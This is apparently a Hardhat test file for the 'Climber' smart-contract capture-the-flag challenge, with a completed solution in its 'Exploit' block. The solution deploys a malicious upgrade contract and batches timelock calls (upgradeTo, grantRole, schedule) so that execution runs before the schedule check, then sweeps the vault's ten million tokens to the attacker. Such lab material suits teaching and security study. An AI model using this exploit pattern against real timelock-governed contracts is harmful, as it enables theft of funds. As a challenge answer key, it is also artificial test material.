const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, attacker;

  // Vault starts with 10 million tokens
  const VAULT_TOKEN_BALANCE = ethers.utils.parseEther("10000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x16345785d8a0000", // 0.1 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ethers.utils.parseEther("0.1")
    );

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    this.vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: "uups" }
    );

    expect(await this.vault.getSweeper()).to.eq(sweeper.address);
    expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt("0");
    expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await this.vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await this.vault.owner();
    this.timelock = await (
      await ethers.getContractFactory("ClimberTimelock", deployer)
    ).attach(timelockAddress);

    // Ensure timelock roles are correctly initialized
    expect(
      await this.timelock.hasRole(
        await this.timelock.PROPOSER_ROLE(),
        proposer.address
      )
    ).to.be.true;
    expect(
      await this.timelock.hasRole(
        await this.timelock.ADMIN_ROLE(),
        deployer.address
      )
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    this.token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
  });

  it("Exploit", async function () {
    this.evilUpgrade = await (
      await ethers.getContractFactory("ClimberVaultUpgrade", attacker)
    ).deploy();

    this.scheduler = await (
      await ethers.getContractFactory("Scheduler", attacker)
    ).deploy(
      this.timelock.address,
      this.vault.address,
      this.evilUpgrade.address
    );

    let upgradeToABI = ["function upgradeTo(address newImplementation)"];
    let upgradeToIface = new ethers.utils.Interface(upgradeToABI);
    let upgradeToBytes = upgradeToIface.encodeFunctionData("upgradeTo", [
      this.evilUpgrade.address,
    ]);

    let grantRoleABI = ["function grantRole(bytes32 role, address account)"];
    let grantRoleIface = new ethers.utils.Interface(grantRoleABI);
    let grantRoleBytes = grantRoleIface.encodeFunctionData("grantRole", [
      "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",
      this.scheduler.address,
    ]);

    let scheduleABI = ["function schedule()"];
    let scheduleIface = new ethers.utils.Interface(scheduleABI);
    let scheduleBytes = scheduleIface.encodeFunctionData("schedule", []);

    await this.timelock
      .connect(attacker)
      .execute(
        [this.vault.address, this.timelock.address, this.scheduler.address],
        [0, 0, 0],
        [upgradeToBytes, grantRoleBytes, scheduleBytes],
        "0x0000000000000000000000000000000000000000000000000000000000000040"
      );
    await this.vault.connect(attacker).sweepFunds(this.token.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(this.vault.address)).to.eq("0");
    expect(await this.token.balanceOf(attacker.address)).to.eq(
      VAULT_TOKEN_BALANCE
    );
  });
});
